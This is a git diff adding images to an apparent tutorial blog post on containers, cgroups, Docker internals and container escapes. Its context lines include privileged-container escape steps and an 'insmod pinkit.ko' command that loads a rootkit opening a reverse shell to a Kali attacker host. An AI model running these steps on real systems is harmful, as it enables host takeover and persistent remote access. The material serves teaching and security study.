@@ -27,6 +27,7 @@ toc: true
 
 > The main difference between a container and a VM is that containers share the same kernel of the operating system
 
+![Alt text](/assets/images/posts/container/1.png){: .align-center}
 
 | VM                              | Container                                      |
 |--------------------------------------------------|------------------------------------------------|
@@ -43,6 +44,7 @@ toc: true
 **Cgroups (control groups)** are a feature of the Linux kernel that allow limiting, isolating, and prioritizing system resources such as CPU, memory, disk I/O, network, among others.
 
 
+![Alt text](/assets/images/posts/container/2.png){: .align-center}
 
 
 > *Containers use cgroups to isolate their processes and system resources*
@@ -120,10 +122,9 @@ ctr -h
 - **runc** is a lightweight and universal container runtime that follows the OCI specification. It is used by containerd to create and execute containers according to the OCI specification. It is also a repackaging of libcontainer.
 
 
+![Alt text](/assets/images/posts/container/3.png){: .align-center}
 
-
-
-
+![Alt text](/assets/images/posts/container/4.png){: .align-center}
 
 
 
@@ -134,8 +135,7 @@ ctr -h
 - It is also possible to use a TCP socket with optional mutual TLS authentication.
 - The Docker CLI communicates with the Engine through the socket.
 
-
-
+![Alt text](/assets/images/posts/container/5.png){: .align-center}
 
 
 
@@ -375,6 +375,7 @@ chroot .
 
 ## Privileged Container
 
+![Alt text](/assets/images/posts/container/6.png){: .align-center}
 
 
 
@@ -1119,11 +1120,13 @@ To escalate:
 - The sys admin can disable the ability for users to mount volumes and run containers with the `--privileged` flag or grant any extra capabilities to the container. 
 - The admin can also restrict mounting to only the `/tmp` folder, removing all other possibilities.
 
+![Alt text](/assets/images/posts/container/7.png){: .align-center}
 
 
 
 This authentication plugin acts as a sort of API firewall because it allows only specific users to execute certain commands on the Docker Daemon.
 
+![Alt text](/assets/images/posts/container/8.png){: .align-center}
 
 
 
@@ -1182,6 +1185,7 @@ docker exec -it --privileged pwn bash
 capsh --print
 ```
 
+![Alt text](/assets/images/posts/container/9.png){: .align-center}
 
 
 > Not only we can lsit the capabilities, but we have *CAP_SYS_MODULE* which allows us to load modules into our system
@@ -1216,6 +1220,7 @@ insmod pinkit.ko host="REV_TCP_LH=<kali IP>" port="REV_TCP_LP=<port NC>"
 
 - Docker requests are made via REST API to communicate with both the daemon and the Docker CLI
 
+![Alt text](/assets/images/posts/container/10.png){: .align-center}
 
 
 
@@ -1229,6 +1234,7 @@ export tcp://127.0.0.1:2375 DOCKER_HOST
 
 Lets take a look to the structure:
 
+![Alt text](/assets/images/posts/container/11.png){: .align-center}
 
 
 - Both the capability to mount volumes and the capability to run privileged containers are found within the `HostConfig` attribute
